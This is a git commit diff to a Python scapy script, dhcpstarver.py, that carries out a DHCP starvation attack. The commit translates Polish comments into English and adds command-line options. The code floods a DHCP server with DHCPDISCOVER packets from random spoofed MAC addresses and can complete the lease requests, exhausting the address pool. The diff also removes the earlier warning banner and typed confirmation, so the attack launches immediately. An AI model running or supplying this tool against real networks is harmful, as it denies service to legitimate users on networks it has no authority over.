5d0cd4d7bf5fa8442847196b064a44cd34c00af5
itsbudyn <jakub.kedziora@gmail.com>
2024-01-24 16:43:12 +0100

    add argparse and translate to english

--- dhcpstarver.py
+++ dhcpstarver.py
@@ -4,44 +4,41 @@ from scapy.layers.l2 import Ether
 from scapy.layers.inet import IP, UDP
 from time import sleep, time
 from threading import Thread
+import argparse
 
 class DHCPStarvation:
-    def __init__(self, iface="", singleSpoofedMAC=False, customMAC="", finishDORA=False, sleepTimer=0.2, targetDHCPServerIP="255.255.255.255", loggingEnabled=False):
-        self.macs=[]
-        self.singlemac=""
+    def __init__(self, iface="", finishDORA=False, sleepTimer=0.2, targetDHCPServerIP="255.255.255.255", logfile=""):
+        self.macs = []
+        self.singlemac = ""
 
-        self.iface=iface
-        self.singleSpoofedMAC=singleSpoofedMAC
-        self.sleepTimer=sleepTimer
-        self.finishDORA=finishDORA
-        self.targetDHCPServerIP=targetDHCPServerIP
-        self.loggingEnabled=loggingEnabled
+        self.iface = iface
+        self.sleepTimer = sleepTimer
+        self.finishDORA = finishDORA
+        self.targetDHCPServerIP = targetDHCPServerIP
+        self.logfile = logfile
 
-        if singleSpoofedMAC and customMAC: self.singlemac = customMAC
-
-    # Funkcja drukująca komunikaty na stdout oraz zapisująca do pliku log.txt
+    # Function to write events to stdout and log to file if enabled
     def log(self, message):
-        timestamp=str(time()-starttime)[:14]
-        out=str(timestamp+"\t"+message+"\n")
+        timestamp = str(time()-starttime)[:14]
+        out = str(timestamp+"\t"+message+"\n")
         print(out,end="\0")
-        if self.loggingEnabled:
-            with open("log.txt","a",encoding="UTF-8") as f: f.write(out)
+        if self.logfile:
+            with open(self.logfile,"a",encoding="UTF-8") as f: f.write(out)
 
-    # Główna pętla programu dokonująca ataku DHCP Starvation 
-    # oraz utowrzenie wątku listenera pakietów sieciowych
+    # Main loop, defines packet listener thread and starts the attack
     def start(self):
         thread = Thread(target=self.listen)
         thread.start()
-        self.log(f"Uruchomiono DHCP Starvation")
+        self.log(f"DHCP Starvation Launched")
 
         while True: self.starve()
 
-    # Nasłuchiwanie pakietów UDP na portach 67 i 68 - Przekazanie pasujących pakietów do metody handleDHCP
+    # Sniffing UDP datagrams from ports 67, 68. Pass matches to handleDHCP()
     def listen(self): sniff(filter="udp and (port 67 or port 68)", prn=self.handleDHCP, store=0, iface=self.iface)
 
-    # Wysłanie odpowiedzi na DHCPOffer - DHCPRequest z otrzymanymi parametrami konfiguracyjnymi 
+    # Replying to DHCPOffer if enabled by sending a proper DHCPRequest
     def DHCPRequest(self, client_mac, server_mac, server_ip, given_ip):
-        # Definicja pakietu sieciowego do wysłania
+        # Defining DHCPDRequest network packet to send
         req = Ether(src=client_mac, dst="FF:FF:FF:FF:FF:FF")
         req /= IP(src="0.0.0.0", dst=server_ip)
         req /= UDP(sport=68, dport=67)
@@ -53,73 +50,66 @@ class DHCPStarvation:
             "end"])
         
         sendp(req, verbose=0, iface=self.iface)
-        self.log(f"Wysłano z\t{client_mac} do ({server_ip} {server_mac}) DHCPREQUEST na {given_ip}")
+        self.log(f"Client MAC:\t{client_mac} SEND to ({server_ip} {server_mac}) DHCPREQUEST of IP {given_ip}")
 
     def getDHCPOption(self, packet, option:str):
         for i in packet[DHCP].options:
             if i[0] == option: return i[1]
 
-    # Obsługa otrzymanych pakietów DHCP
+    # Handles received DHCP Packets
     def handleDHCP(self, pkt):
         if pkt[DHCP]:
             msgtype = self.getDHCPOption(pkt, "message-type")
-            # Jeżeli otrzymamy pakiet DHCPOFFER
-
             match msgtype:
+                # On DHCPOFFER
                 case 2:
-                    # Pobranie parametrów z pakietu
-                    given_ip = pkt.getlayer(BOOTP).yiaddr
+                    # Get parameters from packet
+                    given_ip          = pkt.getlayer(BOOTP).yiaddr
                     given_subnet_mask = self.getDHCPOption(pkt, "subnet_mask")
-                    given_dns = self.getDHCPOption(pkt, "name_server")
-                    server_ip = self.getDHCPOption(pkt, "server_id")
-                    server_mac = pkt[Ether].src
-                    client_mac_b = pkt[BOOTP].chaddr
-                    client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
-                    gateway = self.getDHCPOption(pkt, "router")
+                    given_dns         = self.getDHCPOption(pkt, "name_server")
+                    server_ip         = self.getDHCPOption(pkt, "server_id")
+                    server_mac        = pkt[Ether].src
+                    client_mac_b      = pkt[BOOTP].chaddr
+                    client_mac        = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
+                    gateway           = self.getDHCPOption(pkt, "router")
 
-                    self.log(f"Odebrano na\t{client_mac} od ({server_ip} {server_mac}) DHCPOFFER ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")
+                    self.log(f"Client MAC:\t{client_mac} RECV from ({server_ip} {server_mac}) DHCPOFFER ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")
 
                     if self.finishDORA: self.DHCPRequest(client_mac, server_mac, server_ip, given_ip)
 
-            # Jeżeli otrzymamy pakiet DHCPACK
+            # On DHCPACK
                 case 5:
-                    # Pobranie parametrów z pakietu
-                    given_ip = pkt.getlayer(BOOTP).yiaddr
+                    # Get parameters from packet
+                    given_ip          = pkt.getlayer(BOOTP).yiaddr
                     given_subnet_mask = self.getDHCPOption(pkt, "subnet_mask")
-                    given_dns = self.getDHCPOption(pkt, "name_server")
-                    server_ip = self.getDHCPOption(pkt, "server_id")
-                    server_mac = pkt[Ether].src
-                    client_mac_b = pkt[BOOTP].chaddr
-                    client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
-                    gateway = self.getDHCPOption(pkt, "router")
+                    given_dns         = self.getDHCPOption(pkt, "name_server")
+                    server_ip         = self.getDHCPOption(pkt, "server_id")
+                    server_mac        = pkt[Ether].src
+                    client_mac_b      = pkt[BOOTP].chaddr
+                    client_mac        = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
+                    gateway           = self.getDHCPOption(pkt, "router")
 
-                    self.log(f"Odebrano na\t{client_mac} od ({server_ip} {server_mac}) DHCPACK ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")
+                    self.log(f"Client MAC:\t{client_mac} RECV from ({server_ip} {server_mac}) DHCPACK ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")
                 
-                # Jeżeli otrzymamy pakiet DHCPNAK
+                # On DHCPNAK
                 case 6:
-                    server_ip = self.getDHCPOption(pkt, "server_id")
-                    server_mac = pkt[Ether].src
+                    server_ip    = self.getDHCPOption(pkt, "server_id")
+                    server_mac   = pkt[Ether].src
                     client_mac_b = pkt[BOOTP].chaddr
-                    client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
+                    client_mac   = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
 
-                    self.log(f"Odebrano na\t{client_mac} od ({server_ip} {server_mac}) DHCPNAK")
+                    self.log(f"Client MAC:\t{client_mac} RECV from ({server_ip} {server_mac}) DHCPNAK")
 
-
-    # Losowanie adresów MAC i wysyłanie pakietu DHCPDISCOVER
+    # Randomize a MAC address and send DHCPDiscover
     def starve(self):
 
-        # Generacja adresów MAC (lub jednego adresu w przypadku wybrania takiej opcji)
-        src_mac=0
-        if self.singleSpoofedMAC:
-            if len(self.singlemac)==0: self.singlemac = RandMAC()
-            src_mac = self.singlemac
-        else:
-            src_mac = RandMAC()
-            while src_mac in self.macs: src_mac = RandMAC()
-            self.macs.append(src_mac)
+        # Unique MAC Address generation
+        src_mac = RandMAC()
+        while src_mac in self.macs: src_mac = RandMAC()
+        self.macs.append(src_mac)
 
-        # Definicja pakietu sieciowego do wysłania
-        pkt = Ether(src=mac2str(src_mac), dst="ff:ff:ff:ff:ff:ff")
+        # Defining bogus DHCPDiscover network packet to send
+        pkt  = Ether(src=mac2str(src_mac), dst="ff:ff:ff:ff:ff:ff")
         pkt /= IP(src="0.0.0.0", dst=self.targetDHCPServerIP)
         pkt /= UDP(sport=68, dport=67)
         pkt /= BOOTP(chaddr=mac2str(src_mac))
@@ -127,49 +117,20 @@ class DHCPStarvation:
             ("message-type","discover"),
             "end"])
         sendp(pkt, verbose=0, iface=self.iface)
-        self.log(f"Wysłano z\t{src_mac} DHCPDISCOVER")
+        self.log(f"Client MAC:\t{src_mac} SEND DHCPDISCOVER")
         sleep(self.sleepTimer)
 
 if __name__ == "__main__":
-    # Opis poniższych opcji:
-    # iface                 - Interfejs do nasłuchiwania i generowania ruchu sieciowego.
-    # singleSpoofedMAC      - Czy losować za każdym zapytaniem nowy adres MAC
-    # customMAC             - Działa tylko przy singleSpoofedMAC = True. Pozwala na ustalenie własnego adresu MAC do przeprowadzenia ataku
-    # finishDORA            - Czy po otrzymaniu DHCP Offer odpowiadać za pomocą DHCP Request
-    # sleepTimer            - Odstęp czasu w sekundach między każdym wysłanym pakietem DHCP Discover
-    # targetDHCPServerIP    - Adres IP docelowego serwera DHCP. Domyślna wartość 255.255.255.255 to adres broadcast
-    # loggingEnabled        - Czy zapisywać każdy z komunikatów do pliku log.txt?
+    ver = "0.9.0"
 
-    iface               = "enp3s0"
-    singleSpoofedMAC    = False
-    customMAC           = "08:bc:20:66:ae:22"
-    finishDORA          = False
-    sleepTimer          = 0.001
-    targetDHCPServerIP  = "255.255.255.255"
-    loggingEnabled      = True
+    parser = argparse.ArgumentParser(description=f"DHCP Starvation Attack Launcher - by itsbudyn - v{ver}", epilog="WARNING: By using this program, you acknowledge the contents of README.MD.")
+    parser.add_argument("iface", type=str, help="Used network interface")
+    parser.add_argument("-f","--full", help="Complete DORA by replying to DHCPOFFER messages with DHCPREQUEST", action="store_true")
+    parser.add_argument("-t","--time", type=float, default=0.001, help="Time between DHCPDISCOVER messages. Default - 0.001s")
+    parser.add_argument("-s","--server", metavar="IP", type=str, default="255.255.255.255", help="Target IP of DHCP Server. Default - Broadcast")
+    parser.add_argument("-l","--log", metavar="FILE", type=str, default="", help="Enable logging to a text file")
+    args = parser.parse_args()
 
-    print(
-"""
-                         !!! UWAGA !!!
-    ! ZA CHWILĘ ZOSTANIE URUCHOMIONY ATAK DHCP STARVATION !
-
-Ten program doprowadzi do wygłodzenia serwera DHCP i naruszenia
-                poprawnego działania sieci.
-
-   Jeżeli nie jest to Twoja sieć, nie jesteś autoryzowany/a do 
-   wykonywania opisanych czynności, lub nie rozumiesz działania
-      skryptu, NATYCHMIAST ZAKOŃCZ ten skrypt (np. Ctrl + C).
-
-Jeżeli rozumiesz powyższą treść oraz przyjmujesz odpowiedzialność
-     za wszelkie następstwa uruchomienia tego skryptu, aby go 
-             uruchomić przepisz frazę "Uruchom atak."
-"""
-)
-
-    loop = DHCPStarvation(iface, singleSpoofedMAC, customMAC, finishDORA, sleepTimer, targetDHCPServerIP, loggingEnabled)
-
-    while True:
-        choice=input("> ")
-        if choice=="Uruchom atak.": 
-            starttime = time()
-            loop.start()
+    loop = DHCPStarvation(args.iface, args.full, args.time, args.server, args.log)
+    starttime = time()
+    loop.start()
